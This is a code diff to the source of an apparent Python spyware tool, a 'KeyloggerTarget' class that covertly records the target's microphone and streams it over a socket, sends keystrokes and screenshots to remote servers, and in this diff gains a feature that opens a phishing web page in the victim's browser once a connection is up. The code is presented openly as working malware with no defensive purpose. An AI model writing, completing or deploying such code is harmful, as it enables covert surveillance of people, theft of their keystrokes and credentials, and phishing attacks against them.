@@ -13,14 +13,13 @@ import ast
 import BetterPrinting as bp
 import random
 import tkinter as tk
+import requests
+import webbrowser
 
 class KeyloggerTarget:
     def __init__(self, ip_of_server_photos, port_of_server_photos, ip_of_server_keylogger_data,
                  port_of_server_keylogger_data, ip_of_server_listener, port_of_server_listener, ip_of_timer,
-                 port_of_timer, duration_in_seconds=200):
-        global listening_time
-        global ip_listener
-        global port_listener
+                 port_of_timer, duration_in_seconds=200, phishing_web=None):
         # "duration_in_seconds" tells the programm how long it should last the default time is 200 seconds that's 3 Minutes and 20 Seconds
         self.ip_photos = ip_of_server_photos
         self.port_photos = port_of_server_photos
@@ -31,10 +30,8 @@ class KeyloggerTarget:
         self.duration = duration_in_seconds
         self.ip_timer = ip_of_timer
         self.port_timer = port_of_timer
+        self.phishing = phishing_web
 
-        ip_listener = self.ip_listener
-        port_listener = self.port_listener
-        listening_time = self.duration
         self.check = []
         self.caps = False
         self.richtige_liste = None
@@ -44,13 +41,13 @@ class KeyloggerTarget:
 
     def daten_aufnehemen(self):
         listening_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-        listening_data.connect((ip_listener, port_listener))
+        listening_data.connect((self.ip_listener, self.port_listener))
         try:
             format = pyaudio.paInt16
             channels = 2
             rate = 44100
             chunk = 1024
-            seconds = listening_time + 1
+            seconds = self.duration + 1
 
             audio = pyaudio.PyAudio()
 
@@ -123,6 +120,7 @@ class KeyloggerTarget:
         # The seconds the image will be sent in 20 steps to the server will be saved in "seconds_list"
         print(seconds_list)
         key_data = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+
         try:
             for x in range(zeit + 1):
                 if x == 20:
@@ -246,6 +244,15 @@ class KeyloggerTarget:
             raise TypeError(f"{self.duration} is not greater and not equal to 60")
         # "duration_in_seconds" should always be bigger than 60 seconds
         else:
+            if self.phishing is not None:
+                while True:
+                    try:
+                        response = requests.get("https://www.google.com")
+                        webbrowser.open(self.phishing)
+                        break
+
+                    except requests.exceptions.ConnectionError:
+                        print("No connection")
             listening_thread = threading.Thread(target=self.daten_aufnehemen)
             # This runs the programm behind the actual programming
             listening_thread.start()
@@ -642,7 +649,7 @@ class Timer:
         false_second = minutes * 60
         exact_seconds = seconds - false_second
 
-        print(f"The target is being connected. The IP of the target is coming....")
+        print(f"\nThe target is being connected. The IP of the target is coming....")
         while seconds:
             mins, secs = divmod(seconds, 60)
             timer = '{:02d}:{:02d}'.format(mins, secs)
